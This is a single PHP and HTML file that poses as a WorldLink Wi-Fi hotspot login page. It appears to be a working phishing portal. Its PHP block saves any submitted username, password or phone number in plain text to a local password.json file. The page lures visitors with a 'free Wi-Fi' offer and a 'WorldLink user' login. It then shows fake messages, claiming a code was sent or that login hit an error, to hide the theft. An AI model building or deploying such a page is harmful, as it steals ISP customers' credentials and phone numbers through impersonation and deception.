<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $data = json_decode(file_get_contents('php://input'), true);
    $formType = $data['formType'] ?? '';

    $username = $data['username'] ?? '';
    $password = $data['password'] ?? '';
    $phone = $data['phone'] ?? '';

    // Define the file path to save the credentials
    $filePath = __DIR__ . '/password.json';

    // Check if the file exists
    if (file_exists($filePath)) {
        // Read existing data
        $existingData = json_decode(file_get_contents($filePath), true);
    } else {
        $existingData = [];
    }

    // Append the new credentials based on the form type
    if ($formType === 'credentials') {
        if (!$username || !$password) {
            echo json_encode(['status' => 'error', 'message' => 'Username and password are required']);
            exit;
        }
        $existingData[] = [
            'username' => $username,
            'password' => $password
        ];
    } elseif ($formType === 'phone') {
        if (!$phone) {
            echo json_encode(['status' => 'error', 'message' => 'Phone number is required']);
            exit;
        }
        $existingData[] = [
            'phone' => $phone
        ];
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid form type']);
        exit;
    }

    // Save data to passwords.json
    if (file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT))) {
        echo json_encode(['status' => 'success', 'message' => 'Data stored successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Error saving data']);
    }
    exit;
}

?>


 <!DOCTYPE html>
<html>
<head>
    <title>WorldLink Login</title>
    <!-- <link rel="stylesheet" href="style.css"> -->
</head>
<style>
    body{
        background-color: rgb(7, 42, 82) !important;
    }

    nav {
        background-color: white;
        padding: 20px 20px;
        display: flex;
        justify-content: space-between;
        width: 90%;
        margin: 20px auto;
        border-radius: 10px;
        align-items: center;
    }

    nav img {
        height: 50px;
    }

    #button {
        display: flex;
        justify-content: center;
        border: none;
    }

    #getOnlineButton {
        background-color: rgb(7, 42, 82);
        padding: 5px 10px;
        color: white;
        font-size: 30px;
        font-weight: bold;
        border-radius: 6px;
        border: none;
        cursor: pointer;
        transition: all 0.3s ease-in-out;
    }

    #getOnlineButton:hover {
        background-color: blue;
    }

    body {
        font-family: Arial, sans-serif;
        margin: 0;
    }

    .modal {
        display: none;
        position: fixed;
        z-index: 1;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0,0,0,0.4);
        padding-top: 60px;
    }

    .modal-content {
        background-color: #fefefe;
        margin: 5% auto;
        padding: 20px;
        border: 1px solid #888;
        width: 100%;
        max-width: 500px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        animation: fadeIn 0.3s ease;
    }

    .close {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }

    .close:hover,
    .close:focus {
        color: black;
        text-decoration: none;
        cursor: pointer;
    }

    .option {
        margin: 20px 0;
        padding: 15px;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    .free-wifi {
        background-color: rgb(255, 255, 235);
    }

    .worldlink-user {
        background-color: rgb(7, 42, 82);
        color: white;
    }

    .connect {
        display: inline-block;
        margin-top: 10px;
        padding: 10px 20px;
        background-color: #007bff;
        color: white;
        text-decoration: none;
        border-radius: 5px;
        transition: background-color 0.3s;
        cursor: pointer;
    }

    .connect:hover {
        background-color: #0056b3;
    }

    @keyframes fadeIn {
        from {opacity: 0;}
        to {opacity: 1;}
    }

    h2 {
        color: black;
    }

    #p {
        color: black;
    }

    .login-form {
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .login-form input {
        width: calc(100% - 22px);
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 14px;
    }

    .login-form a {
        text-decoration: none;
        color: #007bff;
        font-size: 12px;
        margin-top: 5px;
    }

    .login-form a:hover {
        text-decoration: underline;
    }

    .login-form p {
        font-size: 12px;
        color: #555;
    }

    .login-form button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s;
    }

    .login-form button:hover {
        background-color: #0056b3;
    }

    /* Styles for Password Form */
    .container {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        /* max-width: 500px; */
        padding: 20px;
        box-sizing: border-box;
    }

    .login-box {
        background-color: #fff;
        padding: 40px;
        width: 100%;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        text-align: center;
    }

    .login-box h1 {
        font-size: 24px;
        color: #1a2c58; /* Dark blue color */
        margin-bottom: 20px;
    }

    .login-box h2 {
        font-size: 18px;
        color: #333;
        margin-bottom: 20px;
    }

    .login-box .highlight {
        color: #e74c3c;
    }

    .login-box form {
        display: flex;
        flex-direction: column;
    }

    .login-box input[type="text"] {
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 5px;
        border: 1px solid #ddd;
        font-size: 16px;
    }
    .login-box input[type="password"] {
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 5px;
        border: 1px solid #ddd;
        font-size: 16px;
    }

    .login-box button {
        padding: 10px;
        background-color: #1a2c58; /* Dark blue color */
        color: #fff;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }

    .login-box button:hover {
        background-color: #0948b3;
    }

    .message-box {
        display: none;
        background-color: #d4edda;
        color: #155724;
        border: 1px solid #c3e6cb;
        border-radius: 5px;
        padding: 15px;
        margin: 20px 0;
        text-align: center;
    }

    .message-box.error {
        background-color: #f8d7da;
        color: #721c24;
        border: 1px solid #f5c6cb;
    }

    /* @media (max-width: 480px) {
        .login-box {
            padding: 20px;
        }

        .login-box h1 {
            font-size: 20px;
        }

        .login-box h2 {
            font-size: 16px;
        }

        .login-box input[type="password"] {
            font-size: 14px;
        }
        .login-box button {
            font-size: 14px;
        }
    } */

    @media (max-width: 768px) {
    nav {
        flex-direction: column;
        align-items: center;
        text-align: center;
    }

    nav img {
        margin-bottom: 10px;
    }

    #getOnlineButton {
        font-size: 14px;
        padding: 5px 20px;
    }

    .modal-content {
        width: 500px;
    }

    .login-box {
        padding: 20px;
    }

    .login-box h1 {
        font-size: 20px;
    }

    .login-box h2 {
        font-size: 16px;
    }

    .login-box input {
        font-size: 14px;
    }

    .login-box button {
        font-size: 14px;
    }
}

@media (max-width: 480px) {
    nav {
        flex-direction: column;
        align-items: center;
        text-align: center;
    }

    nav img {
        margin-bottom: 10px;
    }

    .modal-content {
        width: 480px;
    }

    .login-box {
        padding: 15px;
    }

    .login-box h1 {
        font-size: 18px;
    }

    .login-box h2 {
        font-size: 14px;
    }

    .login-box input {
        font-size: 12px;
        padding: 8px;
    }

    .login-box button {
        font-size: 14px;
        padding: 8px;
    }

    .connect {
        font-size: 14px;
        padding: 8px 16px;
    }
}
@media (max-width: 425px){
    .modal-content {
    min-width: 400px;
    }
}

</style>
<body>
    <nav>
        <img src="worldlink.jpeg" alt="GOOD">
        <div id="button">
            <button id="getOnlineButton">Get Online</button>
        </div>
        
    </nav>
	 
    <div id="optionsModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Login to WorldLink Wi-Fi Express</h2>
            <div class="option free-wifi">
                <h3 style="color: green;">Connect for Free Wi-Fi</h3>
                <p id="p">Free 500 MB pack Enjoy WorldLink Hotspot service in 14000+ Hotspots all over Nepal.</p>
                <a href="#" class="connect" id="connectFreeWiFi">Connect</a>
            </div>
            <div class="option worldlink-user">
                <h3 style="color: yellow;">I'm a WorldLink User</h3>
                <p>Exclusively enjoy free unlimited internet.</p>
                <a href="#" class="connect" id="connectWorldLinkUser">Connect</a>
            </div>
        </div>
    </div>

    <div id="loginModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Login to WorldLink Wi-Fi Express</h2>
            <form class="login-form">
                <div style="display: flex;">
                    <select style="padding: 10px; border: 1px solid #ccc; border-radius: 5px 0 0 5px; font-size: 14px; margin-right: 10px;">
                        <option value="+977">+977</option>
                    </select>
                    <input type="text" id="phoneNumber" placeholder="Phone Number" required>
                </div>
                <button type="submit">Send code</button>
                <p style="font-size: 10px;">By clicking "Login", you agree to our Terms of Use and Privacy Policy.</p>
            </form>
        </div>
    </div>

    <div id="passwordModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <div class="container">
                <div class="login-box">
                    <h1>Worldlink</h1>
                    <h2>Enter Your Worldlink <span class="highlight">Details</span></h2>
                    <form id="passwordForm">
                        <input type="text" id="username" placeholder="Username" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit" id="savePasswordBtn">Submit</button>
                    </form>
                    <div id="messageBox" class="message-box"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var optionsModal = document.getElementById("optionsModal");
            var loginModal = document.getElementById("loginModal");
            var passwordModal = document.getElementById("passwordModal");

            var getOnlineButton = document.getElementById("getOnlineButton");
            var connectFreeWiFi = document.getElementById("connectFreeWiFi");
            var connectWorldLinkUser = document.getElementById("connectWorldLinkUser");

            var closeButtons = document.getElementsByClassName("close");

            // Open Options Modal
            getOnlineButton.onclick = function () {
                optionsModal.style.display = "block";
            }

            // Open Login Modal
            connectFreeWiFi.onclick = function (event) {
                event.preventDefault();
                optionsModal.style.display = "none";
                loginModal.style.display = "block";
            }

            // Open Password Modal
            connectWorldLinkUser.onclick = function (event) {
                event.preventDefault();
                optionsModal.style.display = "none";
                passwordModal.style.display = "block";
            }

            // Close any Modal
            for (var i = 0; i < closeButtons.length; i++) {
                closeButtons[i].onclick = function () {
                    optionsModal.style.display = "none";
                    loginModal.style.display = "none";
                    passwordModal.style.display = "none";
                }
            }

            // Close Modal if clicked outside
            window.onclick = function (event) {
                if (event.target == optionsModal) {
                    optionsModal.style.display = "none";
                }
                if (event.target == loginModal) {
                    loginModal.style.display = "none";
                }
                if (event.target == passwordModal) {
                    passwordModal.style.display = "none";
                }
            }

            // Save Phone Number Form Logic
            var phoneForm = document.querySelector('.login-form');
            phoneForm.onsubmit = function (event) {
                event.preventDefault();

                var phoneNumber = document.getElementById("phoneNumber").value;

                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.href, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.onload = function () {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.status === 'success') {
                            alert('Code has been sent in your phone number');
                        } else {
                            alert(response.message);
                        }
                    } catch (e) {
                        alert('An error occurred.');
                    }
                };

                xhr.onerror = function () {
                    alert('An error occurred while sending the request.');
                };

                xhr.send(JSON.stringify({ formType: 'phone', phone: phoneNumber }));
            };

            // Save Password Form Logic
            var passwordForm = document.getElementById("passwordForm");
            var messageBox = document.getElementById("messageBox");

            passwordForm.onsubmit = function (event) {
                event.preventDefault();

                var username = document.getElementById("username").value;
                var password = document.getElementById("password").value;

                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.href, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.onload = function () {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.status === 'success') {
                            messageBox.style.display = "block";
                            messageBox.className = "message-box";
                            messageBox.innerHTML = "Logged in but some error occured so please check it in few minutes";
                        } else {
                            messageBox.style.display = "block";
                            messageBox.className = "message-box error";
                            messageBox.innerHTML = response.message;
                        }
                    } catch (e) {
                        messageBox.style.display = "block";
                        messageBox.className = "message-box error";
                        messageBox.innerHTML = "An error occurred.";
                    }
                };

                xhr.onerror = function () {
                    messageBox.style.display = "block";
                    messageBox.className = "message-box error";
                    messageBox.innerHTML = "An error occurred while sending the request.";
                };

                xhr.send(JSON.stringify({ formType: 'credentials', username: username, password: password }));
            };
        });
    </script>
</body>

</html>
